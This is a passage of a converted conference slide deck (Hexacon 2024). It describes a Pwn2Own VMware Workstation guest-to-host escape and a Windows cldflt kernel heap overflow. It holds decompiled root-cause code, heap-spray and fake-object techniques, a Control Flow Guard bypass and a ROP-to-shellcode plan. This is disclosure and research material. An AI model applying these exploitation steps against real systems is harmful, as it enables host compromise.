---
title: "Guest Revolution Our Story of Compromising the Host Kernel from the VMware Guest"
speakers: ["Junoh Lee", "Gwangun Jung"]
conference: "Hexacon"
conference_full: "Hexacon 2024"
edition: ""
year: 2024
source_pdf: "Hexacon 2024 Slides/Junoh Lee & Gwangun Jung_Guest Revolution Our Story of Compromising the Host Kernel from the VMware Guest.pdf"
pages: 71
sha256: "a718e903cc88fb1961238d706ecd8b4bc5e69ba1e179d1f03832cc1352f93e72"
text_chars: 32811
ocr_pages: 4
has_ocr: true
redacted_secrets: 0
ocr_confidence: 88.4
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:51:01Z"
---
# Guest Revolution Our Story of Compromising the Host Kernel from the VMware Guest

**Speakers:** Junoh Lee, Gwangun Jung  
**Conference:** Hexacon 2024  
**Source:** `Hexacon 2024 Slides/Junoh Lee & Gwangun Jung_Guest Revolution Our Story of Compromising the Host Kernel from the VMware Guest.pdf` (71 pages)


## Slide 1

**Guest Revolution Our Story of Compromising the Host Kernel from the VMware Guest**

**Junoh Lee & Gwangun Jung**

©2024. Theori. All rights reserved.

## Slide 2

# **Index**

###### **1. Introduction**

- ☼ **Who are we ?**

- ☼ **Pwn2own 2024 Virtualization Category​**

###### **2. Pwning VMware Workstation**

- ☼ **VM escape overview**

- ☼ **HGFS Uninitialized heap data leakage (CVE-2024-22270)** ☼ **VBluetooth URB Use-After-Free (CVE-2024-22267)**

###### **3. Windows Kernel Exploit**

- ☼ **Cldflt Heap Buffer Overflow (CVE-2024-30085)** ☼ **Hunting Universal Heap Spray Object**

- ☼ **Exploitation Strategy**

###### **4. Chaining Exploits**

- ☼ **Dropping Huge Files to Host** ☼ **Finalizing the Chain**

###### **5. Conclusion**

©2024. Theori. All rights reserved.

## Slide 3

## **1. Introduction**

©2024. Theori. All rights reserved.

## Slide 4

**Introduction**

## **Who are we ?**

**Junoh Lee** Researcher @bbbig12

**Gwangun Jung** Researcher @pr0ln

©2024. Theori. All rights reserved.

4

## Slide 5

**Introduction**

## **Pwn2Own 2024 Virtualization Category**

©2024. Theori. All rights reserved.

5


> Recovered by OCR — confidence 94/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Introduction
Pwn2Own 2024 Virtualization Category
Targets:
. Master of Pwn Eligible for Add-
Target Prize . .
Points on Prize
Oracle VirtualBox $40,000 4 Yes
VMware Workstation $80,000 8 Yes
VMware ESXi $150,000 15 No
Microsoft Hyper-V Client $250,000 25 Yes
Available Add-on Prizes:
Add-on Prize
host operating system.
Prize
$50,000
Master of Pwn Points
Escalation of privilege leveraging a
Windows kernel vulnerability on the
5
©2024. Theori. All rights reserved.
```

## Slide 6

### **2. Pwning VMware  Workstation**

©2024. Theori. All rights reserved.


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
2. Pwning VMware Workstation
```

## Slide 7

**Pwning VMware Workstation**

## **VM escape overview**

### **Type 1 and Type 2 hypervisors**

VM 1 VM 2 VM n
Hypervisor

ESXi
Hardware
Type 1

**VM 2 VM n Hypervisor**

**VM 1 VM 2**

Host OS
Hardware
Type 2

**VMware WS/Fusion VirtualBox**

©2024. Theori. All rights reserved.

7

## Slide 8

**Pwning VMware Workstation**

## **VM escape overview**

### **What is VM escape?**

Sandbox
Guest
•
Code Execution
•
File read/write
•
Information leak
•
Denial of Service
VM  vmware-vmx vmware-vmx •
Etc ..
Host
Kernel Devices Process Resources
OS /
Hardware

©2024. Theori. All rights reserved.

8

## Slide 9

**Pwning VMware Workstation**

## **VM escape overview**

### **What is VM escape? – Our research**

#### **Sandbox**

- **Guest** • **Code Execution**

- • **File read/write**

- • **Information leak**

- • **Denial of Service**

- **VM vmware-vmx vmware-vmx** • **Etc ..**

- **Host Kernel Devices Process Resources**

- **OS /**

- **Hardware**

©2024. Theori. All rights reserved.

9

## Slide 10

**Pwning VMware Workstation**

## **VM escape overview**

### **VM Escape CVEs (2023~2024)**

##### **Virtual USB Device**

##### **Network Device**

- CVE-2024-22269 - Bluetooth CVE-2024-22267 - Bluetooth CVE-2023-34044 - Bluetooth CVE-2023-22251  - USB CCID CVE-2023-20870 - Bluetooth CVE-2023-20869 - Bluetooth

- CVE-2024-21113 - E1000 CVE-2024-6505 - VirtIO CVE-2024-4693 - VMXNET3 CVE-2023-6693 - VirtIO CVE-2023-4387 - VirtIO CVE-2023-3567 - Net

##### **Graphic**

##### **Disk Controller & Disk**

   - CVE-2024-22268 - SVGA CVE-2024-21991 - VGA CVE-2024-21115 - VGA

- CVE-2024-21112 - AHCI CVE-2024-22273 - SCSI CVE-2024-20872 - SCSI CVE-2023-42467 - SCSI CVE-2023-4135 - NVMe

**VMware**

**VirtualBox QEMU**

##### **USB Controller**

CVE-2024-22255 - UHCI CVE-2024-22252 - XHCI CVE-2024-21121 - OHCI CVE-2023-21990 - OHCI CVE-2023-21989 - OHCI CVE-2023-21989 - EHCI

##### **Etc**

CVE-2024-22270 - HGFS CVE-2023-21987 - TPM CVE-2023-21988 - GPA ………

©2024. Theori. All rights reserved.

10

## Slide 11

**Pwning VMware Workstation**

## **VM escape overview**

### **VM Escape CVEs (2023~2024)**

**Virtual USB Device**

##### **Network Device**

- CVE-2024-22269 - Bluetooth CVE-2024-22267 - Bluetooth CVE-2023-34044 - Bluetooth CVE-2023-22251  - USB CCID CVE-2023-20870 - Bluetooth CVE-2023-20869 - Bluetooth

- CVE-2024-21113 - E1000 CVE-2024-6505 - VirtIO CVE-2024-4693 - VMXNET3 CVE-2023-6693 - VirtIO CVE-2023-4387 - VirtIO CVE-2023-3567 - Net

##### **Graphic**

##### **Disk Controller & Disk**

CVE-2024-21112 - AHCI CVE-2024-22268 - SVGA CVE-2024-22273 - SCSI CVE-2024-21991 - VGA CVE-2024-20872 - SCSI CVE-2024-21115 - VGA CVE-2023-42467 - SCSI CVE-2023-4135 - NVMe

**VMware**

**VirtualBox**

###### **QEMU**

##### **USB Controller**

CVE-2024-22255 - UHCI CVE-2024-22252 - XHCI CVE-2024-21121 - OHCI CVE-2023-21990 - OHCI CVE-2023-21989 - OHCI CVE-2023-21989 - EHCI

**Etc**

CVE-2024-22270 - HGFS CVE-2023-21987 - TPM CVE-2023-21988 - GPA ………

©2024. Theori. All rights reserved.

11

## Slide 12

**Pwning VMware Workstation**

## **HGFS Uninitialized heap data leakage (CVE-2024-22270)**

### **Host Guest File Sharing (HGFS)**

Guest tools
VMCI / Backdoor
Host RPC Handlers
Hypervisor
Info .... HGFS
Config
Host File System
Host
OS / Hardware

©2024. Theori. All rights reserved.

12

## Slide 13

**Pwning VMware Workstation**

## **HGFS Uninitialized heap data leakage (CVE-2024-22270)**

### **Root cause analysis (1)**

char hgfs_fileread(struct hgfs_req *req, _BYTE *a2){ Block = 0LL; rep = 0LL; // ... if ( (a2[8] & 1) != 0 ){ // ... // Copy file contents to Physmem PhysMem_CopyToMemory_0(*(a2 + 51), v24, v6, 32, 5u); // ... if ( req->version == 1 ) data_size = 0x29LL; else if ( req->version == 2 ) data_size = 0x51LL; else data_size = 0LL; // Allocate a HGFS Response buffer resp = _malloc(data_size + 0x18);

HGFS v1 Response (size=0x41)
0x08
0x00
0x10
0x20
0x30
0x40

#### **malloc doesn’t initialize allocated buffer**

©2024. Theori. All rights reserved.

13

## Slide 14

**Pwning VMware Workstation**

## **HGFS Uninitialized heap data leakage (CVE-2024-22270)**

### **Root cause analysis (2)**

resp->qword_10 = data_size;
HGFS v1 Response (size=0x41)
version = req->version;
resp->dword18 = version;
0x08
0x00
resp->dword1C = 2;
if ( /*version 2*/ ) {  0xD00000000 qword44
// Version2 also doesn't initialize some memory.
0x10
}
else { /*version 1*/ data_size version 2
resp->qword20 = v9; 0x20
}
v9
}// ...
0x30
if ( resp ){
resp->qword_8 = 0xD00000000LL;
resp->qword_0 = qword44;
0x40
vmci_resp_send(resp);  Copy response buffer to guest.
free(resp);
}
// .... 25 bytes of heap are not

**25 bytes of heap are not initialized!!**

©2024. Theori. All rights reserved.

14

## Slide 15

**Pwning VMware Workstation**

## **HGFS Uninitialized heap data leakage (CVE-2024-22270)**

### **Trigger and exploit in Windows guest**

- **HGFS over VMCI is closed source**

   - open-vm-tools project only contains HGFS client over backdoor

   - Windows guest tools is only use HGFS protocol version 2

   - ➢ **Need to write HGFS v1 client over VMCI**

- **To exploit easier, we hooked Windows guest's hgfs.sys driver**

©2024. Theori. All rights reserved.

15

## Slide 16

**Pwning VMware Workstation**

## **HGFS Uninitialized heap data leakage (CVE-2024-22270)**

### **Trigger and exploit in Windows guest**

vmware-vmx
Windows Filesystem hgfs.sys (filter driver)
enter NtReadFile()
HGFSv2Request
build_hgfs_pkt(.., ver, seq)
hgfs_fileread
read file from
\\vmware-host
vmci_resp_send
read_vmci_pkt(resp)
HGFSv2 Response
return NtReadFile()

©2024. Theori. All rights reserved.

16

## Slide 17

**Pwning VMware Workstation**

## **HGFS Uninitialized heap data leakage (CVE-2024-22270)**

### **Trigger and exploit in Windows guest**

vmware-vmx
Windows App hgfs.sys (filter driver)
enter NtReadFile() HGFSv2 Request
build_hgfs_pkt(.., ver, seq)
HGFSv1Request
v2 -> v1
hgfs_fileread
read file from
HGFSv1Response
\\vmware-host
v1 -> v2 vmci_resp_send
read_vmci_pkt(resp)
kernel hook
return NtReadFile()
backup
uninitialized
data

©2024. Theori. All rights reserved.

17

## Slide 18

**Pwning VMware Workstation**

## **HGFS Uninitialized heap data leakage (CVE-2024-22270)**

### **Trigger and exploit in Windows guest**

vmware-vmx
Windows App hgfs.sys (filter driver)
spray CD-ROM
associated objects
enter NtReadFile() HGFSv1Request
build_hgfs_pkt(.., ver, seq)
HGFSv1Request
v2 -> v1
hgfs_fileread
read file from
HGFSv1Response
\\vmware-host
v1 -> v2 vmci_resp_send
read_vmci_pkt(resp)
return NtReadFile()
backup
read vmware-vmx
uninitialized
address
data
©2024. Theori. All rights reserved. kernel level  18

**hook**

## Slide 19

**Pwning VMware Workstation**

## **HGFS Uninitialized heap data leakage (CVE-2024-22270)**

### **Trigger and exploit in Windows guest**

- `[+] Patch VM drivers to trigger [-] Patch vmhgfs.sys Offset 0x1000 [-] Patch vmhgfs.sys Offset 0xabb0 [-] Patch vmhgfs.sys Offset 0x1053 [-] Patch vmhgfs.sys Offset 0xa1d9`

- `[+] Create a file in shared folder [-] File : \\vmware-host\Shared Folders\data\pwn2own_leak.txt`

- `[+] Trigger a leak bug [-] Prepare Heap [-] trigger leak bug multiple time..`

- `....... [!] Leaked address : 00007FF69AC24C70 [!] vmware-vmx.exe base address : 00007FF69A990000`

# **Now, we know base address of vmware-vmx**

©2024. Theori. All rights reserved.

19

## Slide 20

**Pwning VMware Workstation**

## **VBluetooth URB Use-After-Free (CVE-2024-22267)**

### **VMware Virtual Bluetooth Overview**

Virtual Bluetooth
Client Driver
USB Interface
Universal Bus Driver (USBD) (URB Processing)
DATA URB Control URB
USB Controller
Hypervisor  Virtual
Virtual  Virtual Device Vendor
Bluetoot
Hub Mouse Command Command
h
Host Bluetooth
Bluetooth Packet Processing
Receiver
Host
OS / Hardware
Remote Bluetooth
Devices

©2024. Theori. All rights reserved.

20

## Slide 21

**Pwning VMware Workstation**

## **VBluetooth URB Use-After-Free (CVE-2024-22267)**

### **VMware Virtual Bluetooth Overview**

Virtual Bluetooth
Client Driver
USB Interface
Universal Bus Driver (USBD) (URB Processing)
DATA URB Control URB
USB Controller
Hypervisor  Virtual
Virtual  Virtual Device Vendor
Bluetoot
Hub Mouse Command Command
h
Host Bluetooth
Bluetooth Packet Processing
Receiver
Host
OS / Hardware
Remote Bluetooth
Devices

©2024. Theori. All rights reserved.

21

## Slide 22

**Pwning VMware Workstation**

## **VBluetooth URB Use-After-Free (CVE-2024-22267)**

### **Root cause analysis (1)**

> __int64 **(1)** VBluetooth_SubmitUrb(vurb *urb){ pipe = urb->pipe; bufferLen = urb->bufferLen; data = urb->data; dev = pipe->dev; urb->status = 0; urb->actualLen = bufferLen; endpoint = pipe->endpoint; if ( endpoint ) { if ( endpoint == 0x81 ) return VUsbQueue_SubmitURB(&dev->queue0, urb); if ( endpoint == 0x82 ) return VUsbQueue_SubmitURB(&dev->queue0, urb); }

rbufQueue * VUsbQueue_SubmitURB(pools *pool, vurb *urb){ node = AllocNode(pool->node_len); if ( node ) { tail = pool->tail; if ( tail ) *tail = node; else pool->head = &node->next; node_len = pool->node_len; pool->tail = (signed __int64)node; memcpy(&node->pUrb, &urb, node_len - 8); } **No increase the reference counter of  URB object** return VUsbQueue_HandleURBs(pool); }

©2024. Theori. All rights reserved.

22

## Slide 23

**Pwning VMware Workstation**

## **VBluetooth URB Use-After-Free (CVE-2024-22267)**

### **Root cause analysis (2)**

> rbufQueue **(2)** VUsbQueue_HandleURBs(pools *pool){

// ...

curr_node = pool->head; if ( curr_node ){ while ( 1 ){ urb = curr_node->pUrb; // handle a urb object

**USB controller worker**

**VUsbQueue_SubmitURB**

**VUsbQueue_HandleURBs**

**Polling worker**

PooledLinkList_FreeNode(curr_node, pool);

Poll_Callback(1, 2, VUsbCompleteUrb, urb, ...);

##### **Register a job to polling queue**

curr_node = (rbufQueue *)pool->head; if ( !curr_node ) return curr_node; }

Poll_Callback

**job 0**

**....**

**job n**

**VUsbComplete UrbHandler**

©2024. Theori. All rights reserved.

23

## Slide 24

**Pwning VMware Workstation**

## **VBluetooth URB Use-After-Free (CVE-2024-22267)**

### **Reset the USB device**

_int64 __fastcall VBluetooth_SubmitUrb(vurb *urb) void VUsb_DeviceReset(VUsbDevice *dev)
{ {
// ... __int64 *pipeArray;
if ( endpointAddress )  pipeArray = &dev->pipeArray[20];
{  VUsb_ResetPortPipe(pipeArray);
/* handle a non control URB and return */ }
}
/* handle a control URB */
if ( (urbData->bmRequestType & 0x60) != 0x20 )
{ VUSBDevice
// ...
if ( requestType == 9 )
destroy all pipes and URB objects
{
if ( urbData->wValue <= 1u )
...
Pipe Pipe
{
sub_1407BA7E0(urb->pipe->dev, urbData->wValue);
if ( urbData->wValue )
VBluetooth_Reset(dev);
URB URB ...
return (g_usb_func_table->vusbCompleteUrb)(urb);
}

©2024. Theori. All rights reserved.

24

## Slide 25

**Pwning VMware Workstation**

## **VBluetooth URB Use-After-Free (CVE-2024-22267)**

### **Trigger Use-After-Free (1)**

Guest USB controller worker Polling worker
Add a URB into the queue without increasing reference
URB(data)
counter
VUsbQueue_SubmitURB
VUsbQueue_HandleURBs
Poll_Callback
VUsbCompleteUrb URB(data)

©2024. Theori. All rights reserved.

25

## Slide 26

**Pwning VMware Workstation**

## **VBluetooth URB Use-After-Free (CVE-2024-22267)**

### **Trigger Use-After-Free (2)**

Guest USB controller worker Polling worker
URB(data)
VUsbQueue_SubmitURB
VUsbQueue_HandleURBs
URB(reset) VUsbQueue_SubmitURB Time Slice
VBluetooth_Reset
PutURB
(All URBs in VBluetooth)
urb object is freed
VUsbCompleteUrb URB(data)

©2024. Theori. All rights reserved.

26

## Slide 27

**Pwning VMware Workstation**

## **VBluetooth URB Use-After-Free (CVE-2024-22267)**

### **Trigger Use-After-Free (3)**

Guest USB controller worker Polling worker
URB(data)
VUsbQueue_SubmitURB
VUsbQueue_HandleURBs
URB(reset) VUsbQueue_SubmitURB Time Slice
VBluetooth_Reset
__int64 VMCI_out(struct_vmci_data *vmci_data, ...)
PutURB
{
// ... (All URBs in VBluetooth)
buf = malloc(vmci_out->datasize + 24LL);
vmci_data->buf = buf;
if ( buf ) guest controllable!
spray objects
memcpy(buf, recv_data, recv_size);
vmci_data->byte60 = 1;
vmci_data->recv_size = recv_size;
fake URB
vmci_data->totalsize = in_pkt_size; VUsbCompleteUrb
(VMCI buffer)

©2024. Theori. All rights reserved.

27

## Slide 28

**Pwning VMware Workstation**

## **VBluetooth URB Use-After-Free (CVE-2024-22267)**

### **Trigger Use-After-Free (4)**

`char __fastcall VUsb_CompleteUrbAddBatch(vurb *urb) {` **called by VUsbCompleteUrb** `// ... pipe = urb->pipe; // [urb + 18h] data = urb->data; dev = pipe->dev; // [pipe + 20h] if ( unknown_flag && urb->type && pipe->stalled && urb->status == 3 ) urb->status = 4; if ( urb->status == 6 ) { if ( urb->hcpriv ) dev->unk_obj->vtable[4](urb);`

`// ...` **Use this indirect call, we can control rip** `return 0; }`

**Need to bypass Control Flow Guard (CFG)**

©2024. Theori. All rights reserved.

28

## Slide 29

**Pwning VMware Workstation**

## **VBluetooth URB Use-After-Free (CVE-2024-22267)**

### **Bypass Control Flow Guard**

- **To bypass CFG, we need to use ROP based CFG gadget** 1. Callable by indirect call

   2. After execute some code then execute indirect call

- **URB object size is 0xA8, we need to pivot arg0 to guest controllable memory**

- 0 1000

Guest physical memory First page of physical memory is not used after boot !!
Mapped
.data
File

**Guest physical memory First page of physical memory is not used after boot !!**

**Guest’ physical memory base is in .data section of vmware-vmx.**

©2024. Theori. All rights reserved.

29

## Slide 30

**Pwning VMware Workstation**

## **VBluetooth URB Use-After-Free (CVE-2024-22267)**

### **Call an arbitrary CFG gadget**

\```
char__fastcallVUsb_CompleteUrbAddBatch(vurb*urb)
{
// ...
pipe = urb->pipe;// [urb + 18h]
data = urb->data;
dev = pipe->dev;// [pipe + 20h]
if( unknown_flag&& urb->type &&
pipe->stalled && urb->status == 3)
urb->status = 4;
if( urb->status == 6)
{
if( urb->hcpriv)
dev->unk_obj->vtable[4](urb);
// ...
return0;
}
\```

fake URB
&pipe
.... vmware-vmx(.data)
fake pipe
&dev
0x0 0
&unk_obj
0x20
....
fake dev (= physmem )

©2024. Theori. All rights reserved.

30

## Slide 31

**Pwning VMware Workstation**

## **VBluetooth URB Use-After-Free (CVE-2024-22267)**

###### **fake URB**

### **Call an arbitrary CFG gadget**

\```
char__fastcallVUsb_CompleteUrbAddBatch(vurb*urb)
{
// ...
pipe = urb->pipe;// [urb + 18h]
data = urb->data;
dev = pipe->dev;// [pipe + 20h]
if( unknown_flag&& urb->type &&
pipe->stalled && urb->status == 3)
urb->status = 4;
if( urb->status == 6)
{
if( urb->hcpriv)
dev->unk_obj->vtable[4](urb);
// ...
return0;
}
\```

&pipe
.... vmware-vmx(.data)
unk_obj
fake pipe
&vtable,
&dev
0x0 0
&unk_obj
0x20
vtable[4] physmem is guest controllable
....
vtable (= fake dev, physmem )

**<u>Now, we can call an arbitrary gadget</u>**

©2024. Theori. All rights reserved.

31

## Slide 32

**Pwning VMware Workstation**

## **VBluetooth URB Use-After-Free (CVE-2024-22267)**

###### **fake URB**

### **Pivoting arg0 to Guest’s physmem**

&physmem &pipe
....
vmware-vmx(.data)
physmem
....
0x00 ....
.data &unk_obj
0x20
gadget_0
....

###### __int64 **gadget_0** (__int64 urb) {// sub_140323F50

// mov rax, [rcx+10h] // mov rcx, [rax] **rcx == next arg0 == physmem** // mov rax, [rcx] **rax point to .data section**

// mov rax, [rcx] // mov rax, [rax+160h]

// jmp cs:__guard_dispatch_icall_fptr return (*(***(urb + 0x10) + 0x160))(**(urb + 0x10)); }

#### **.data section is not guest controllable**

**<u>arg0 (= vtable, fake dev, physmem )</u>**

©2024. Theori. All rights reserved.

32

## Slide 33

**Pwning VMware Workstation**

## **VBluetooth URB Use-After-Free (CVE-2024-22267)**

###### **fake URB**

### **Pivoting arg0 to Guest’s physmem**

__int64  gadget_0 (__int64 urb) {// sub_140323F50// sub_140323F50 &physmem &pipe
// mov  rax, [rcx+10h]
// mov  rcx, [rax] rcx == next arg0 == physmem ....
// mov  rax, [rcx] rax point to .data section  vmware-vmx(.data)
// mov  rax, [rax+160h]
// jmp cs:__guard_dispatch_icall_fptr
physmem
return (*(***(urb + 0x10) + 0x160))(**(urb + 0x10)); (*(***(urb + 0x10) + 0x160))(**(urb + 0x10));0x10) + 0x160))(**(urb + 0x10));) + 0x160))(**(urb + 0x10));0x160))(**(urb + 0x10));))(**(urb + 0x10));0x10));));
....
}
vmware-vmx(.rdata)
.rdata:0000000140A0D808 dq offset sub_140295230
0x0 0
__int64  gadget_1 (__int64 phys) {// sub_140295230 phys) {// sub_140295230) {// sub_140295230// sub_140295230 .data &unk_obj ....
gadget_1
0x2 0
return (*(phys + 0x380))(phys); (*(phys + 0x380))(phys);phys + 0x380))(phys); + 0x380))(phys);0x380))(phys);))(phys);
gadget_0
}
gadget_2 = *(phys+0x380) 0x38 0 ....
gadget_2
arg0 (= vtable, fake dev, physmem )

__int64 **gadget_0** (__int64 urb) {// sub_140323F50// sub_140323F50 // mov rax, [rcx+10h] // mov rcx, [rax] **rcx == next arg0 == physmem** // mov rax, [rcx] **rax point to .data section** // mov rax, [rax+160h] // jmp cs:__guard_dispatch_icall_fptr return (*(***(urb + 0x10) + 0x160))(**(urb + 0x10)); (*(***(urb + 0x10) + 0x160))(**(urb + 0x10));0x10) + 0x160))(**(urb + 0x10));) + 0x160))(**(urb + 0x10));0x160))(**(urb + 0x10));))(**(urb + 0x10));0x10));)); }

.rdata:0000000140A0D808 dq offset sub_140295230

__int64 **gadget_1** (__int64 phys) {// sub_140295230 phys) {// sub_140295230) {// sub_140295230// sub_140295230

return (*(phys + 0x380))(phys); (*(phys + 0x380))(phys);phys + 0x380))(phys); + 0x380))(phys);0x380))(phys);))(phys); }

©2024. Theori. All rights reserved.

33

## Slide 34

**Pwning VMware Workstation**

## **VBluetooth URB Use-After-Free (CVE-2024-22267)**

###### **fake URB**

**Pivoting arg0 to Guest’s physmem**

__int64  gadget_0 (__int64 urb) {// sub_140323F50 &physmem &pipe
// mov  rax, [rcx+10h]
// mov  rcx, [rax] rcx == next arg0 == physmem ....
// mov  rax, [rcx] rax point to .data section  vmware-vmx(.data)
// mov  rax, [rax+160h]
// jmp cs:__guard_dispatch_icall_fptr
physmem
Almost data of arg0 are controllable !!
return (*(***(urb + 0x10) + 0x160))(**(urb + 0x10));
....
}
vmware-vmx(.rdata)
.rdata:0000000140A0D808 dq offset sub_140295230
0x0 0
__int64  gadget_1 (__int64 phys) {// sub_140295230 .data &unk_obj ....
gadget_1
0x2 0
return (*(phys + 0x380))(phys);
gadget_0
}
gadget_2 = *(phys+0x380) 0x38 0 ....
gadget_2
arg0 (= vtable, fake dev, physmem )

©2024. Theori. All rights reserved.

34

## Slide 35

**Pwning VMware Workstation**

## **VBluetooth URB Use-After-Free (CVE-2024-22267)**

### **Run Shellcode with CFG based ROP**

- If the payload is well organized, VMware UAF does not cause panic ➢ **VMware UAF can be triggered multiple times**

- **vmware-vmx loads non-CFG libraries**

   - ➢ **We can execute non-CFG gadget**

©2024. Theori. All rights reserved.

35

## Slide 36

**Pwning VMware Workstation**

## **VBluetooth URB Use-After-Free (CVE-2024-22267)**

### **Run Shellcode with CFG based ROP**

1. Read physical memory base

      - It is used by arbitrary memory read/write through memcpy gadget

2. Read kernel32!VirtualProtect, libcrypto module address. • memcpy(physmem+off, IAT+off, ...);

      - ReadPhys(physmem+off, ...) from guest

3. Call VirtualProtect(unused space, ..., PAGE_EXECUTE_READWRITE, ...);

4. Copy shellcode to unused  space

      - WritePhys(physmem+off, ...) from guest

      - memcpy(unused space , physmem + off, ...);

5. Finally,  jump to shellcode using **libcrypto’s gadget.**

   - `// set rcx to shellcode address rcx`

   - `jmp ; switch jump`

©2024. Theori. All rights reserved.

36

## Slide 37

## **3. Windows Kernel Exploit**

©2024. Theori. All rights reserved.


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
3. Windows Kernel Exploit
```

## Slide 38

**Windows Kernel Exploit**

## **Cloud Files Mini Filter (CLDFLT)**

- File System minifilter driver used by OneDrive

- Relatively **large attack surface**

   - ~ 900+ functions

   - Various file operation filters

   - File system placeholder stuffs

   - Filter Communication Ports

- There exists **<u>successful exploits</u>**

   - Blog Post (Star Labs, CVE-2021-31969)

   - Pwn2own 2023 (Synacktiv, CVE-2023-29361)

   - ITW 2023 (Unknown, CVE-2023-36036)

   - …

https://starlabs.sg/blog/2023/11-exploitation-of-a-kernel-pool-overflow-from-a-restrictive-chunk-size-cve-2021-31969/

©2024. Theori. All rights reserved.

38

## Slide 39

**Windows Kernel Exploit**

## **Bug Finding Process**

### **CLDFLT Reparse Point Data Vulnerability**

CVE-2021-31969
CVE-2023-36036
(ZDI, Star labs  This Bug
(ITW)
Blog)

https://www.zerodayinitiative.com/blog/2021/7/19/cve-2021-31969-underflowing-in-the-clouds

©2024. Theori. All rights reserved.

39

## Slide 40

**Windows Kernel Exploit**

## **Storing CLDFLT Reparse Point Data**

buffer->ReparseTag = IO_REPARSE_TAG_CLOUD_3;
... Tag that triggers the filter
NtFsControlFile(hDir,
FSCTL_SET_REPARSE_POINT,
buffer,
buffer_len);

©2024. Theori. All rights reserved.

40

## Slide 41

**Windows Kernel Exploit**

## **CLDFLT Reparse Point Data Structure**

struct _HSM_DATA { DWORD Magic; DWORD Crc32; DWORD Length; USHORT Flags; USHORT NumberOfElements; HSM_ELEMENT_INFO ElementInfos[10]; };

struct _HSM_ELEMENT_INFO
{
USHORT Type;
USHORT Length;
DWORD Offset;
};

Header
Element0 Element1 Element3
(HSM_ELEMENT_INFOs)

https://starlabs.sg/blog/2023/11-exploitation-of-a-kernel-pool-overflow-from-a-restrictive-chunk-size-cve-2021-31969/

©2024. Theori. All rights reserved.

41

## Slide 42

**Windows Kernel Exploit**

## **CLDFLT Heap Buffer Overflow (CVE-2024-30085)**

__int64 HsmIBitmapNORMALOpen() {
...
if ( elem4_buffer && elem4_length - 1 <= 0xFFE )
{
...
Meaningless Condition
}
else
{
v40 = ExAllocatePoolWithTag(PagedPool, 0x1000ui64, 0x6D427348u);
if ( v40 )
{
me mmove(v40, elem4_buffer, elem4_length);
goto LABEL_87;
} Overflow if elem4_length > 0x1000
}

©2024. Theori. All rights reserved.

42

## Slide 43

**Windows Kernel Exploit**

## **No Validation?**

bool HsmpBitmapIsReparseBufferSupported() {
...
elem2_byte = *((_BYTE *)&hsm_data->Magic + elem2_offset);
if ( elem2_byte
&& (hsm_data->NumberOfElements < 4u
Doesn’t perform validation if elem2[0] == 0
|| !hsm_data->ElementInfos[4].Offset
|| hsm_data->ElementInfos[4].Length > 0x1000u) )
{
goto ERROR;
}
...
}

©2024. Theori. All rights reserved.

43

## Slide 44

**Windows Kernel Exploit**

## **What Can We Do?**

- Heap based buffer overflow on fixed size chunk (0x1000)

   - On paged pool

- How many bytes?

   - Almost 0x4000 bytes

      - Actually more, because we can compress the reparse point data

int HsmpRpReadBuffer() { ... v9 = FltFsControlFile(Instance, FileObject, FSCTL_GET_REPARSE_POINT, 0i64, 0, PoolWithTag, 0x4000u, 0i64); ... }

- We can overflow with arbitrary data

   - By setting cldflt reparse point data

©2024. Theori. All rights reserved.

44

## Slide 45

**Windows Kernel Exploit**

## **What Can We Do?**

- Heap based buffer overflow on fixed size chunk (0x1000)

   - On paged pool

• How many bytes?
• Almost 0x4000 bytes
•
Actually more, because we can compress the reparse point data
int HsmpRpReadBuffer()
Exploit Time
{
...
v9 = FltFsControlFile(Instance, FileObject, FSCTL_GET_REPARSE_POINT,
0i64, 0, PoolWithTag, 0x4000u, 0i64);
...
}

- We can overflow with arbitrary data

   - By setting cldflt reparse point data

©2024. Theori. All rights reserved.

45

## Slide 46

**Windows Kernel Exploit**

## **WNF_STATE_DATA**

- <u>Well-known objects</u> in Windows kernel exploits (with Token Object AARW)

- Used for Heap Spray in Paged Pool

- If **<u>DataSize</u>** is overwritten, we can do:

   - OOB Write with **NtUpdateWnfStateData**

   - OOB Read with **NtQueryWnfStateData**

struct _WNF_STATE_DATA { struct _WNF_NODE_HEADER Header; ULONG AllocatedSize; ULONG **DataSize** ; ULONG ChangeStamp; BYTE Data[]; };

©2024. Theori. All rights reserved.

46

## Slide 47

**Windows Kernel Exploit**

## **WNF_STATE_DATA**

### **But, the object has a maximum size limit…**

__int64 __fastcall NtCreateWnfStateName(
...
__int64 __fastcall ExpWnfCreateNameInstance(
unsigned int MaxDataSize,
_WNF_SCOPE_INSTANCE *a1,
PSECURITY_DESCRIPTOR a7)
_WNF_STATE_NAME_STRUCT a2,
{
__int32 *MaxDataSize,
...
_EPROCESS *a4,
if ( MaxDataSize > 0x1000 )
_WNF_NAME_INSTANCE **a5)
{
{
StateName = 0xC000000D;
goto ERROR; ...
WNI->StateNameInfo.MaxStateSize = *MaxDataSize;
}
...
...
}
ExpWnfCreateNameInstance(
...
pMaxDataSize,
...);

©2024. Theori. All rights reserved.

47

## Slide 48

**Windows Kernel Exploit**

## **WNF_STATE_DATA – Big Chunk OOB Write**

### **NtUpdateWnfStateData**

__int64 __fastcall ExpNtUpdateWnfStateData(
...
__int64 __fastcall ExpWnfValidatePubSubPreconditions(
)
...)
{
{
...
...
res = ExpWnfValidatePubSubPreconditions(
TypeId = StateInfo->TypeId;
2u,
if ( !TypeId )
&Instance->StateNameInfo,
return StateInfo->MaxStateSize < Size ? 0xC000000D : 0;
Size,
...
v40, Write Size } Cannot write more than 0x1000 bytes
v34);
if ( res < 0 ) (MaxStateSize <= 0x1000)
goto ERROR;
...
}

©2024. Theori. All rights reserved.

48

## Slide 49

**Windows Kernel Exploit**

## **WNF_STATE_DATA – Big Chunk OOB Write**

### **NtUpdateWnfStateData**

__int64 __fastcall ExpNtUpdateWnfStateData(

{

)

__int64 __fastcall ExpWnfValidatePubSubPreconditions( ...)

{

... ... res = ExpWnfValidatePubSubPreconditions( TypeId = StateInfo->TypeId; 2u, **OOB Write is not possible for chunks of size 0x1000** if ( !TypeId ) &Instance->StateNameInfo, return StateInfo->MaxStateSize < Size ? 0xC000000D : 0; Size,

